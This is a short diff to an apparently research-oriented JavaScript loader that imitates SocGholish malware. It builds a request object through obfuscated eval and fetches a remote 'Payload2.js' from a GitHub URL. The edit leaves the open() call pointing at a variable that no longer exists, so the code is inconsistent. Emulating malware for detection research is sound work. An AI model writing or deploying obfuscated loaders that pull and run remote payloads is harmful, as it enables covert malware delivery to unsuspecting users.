@@ -69,7 +69,8 @@ var _a0x2346 = decrypt(decode(mapping._0x5555), 4) + _a0x7821;
 var XmlHttp_Object = eval(_a0x2346);
 
 // URL of the JavaScript file on GitHub
-var githubFileUrl = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/encoded-payload.txt";
+var githubFileUrl1 = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/Payload2.js";
+var githubFileUrl2 = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/Payload2.js";
 
 // Open a GET request
 XmlHttp_Object.open("GET", githubFileUrl, false); // 'false' for synchronous request
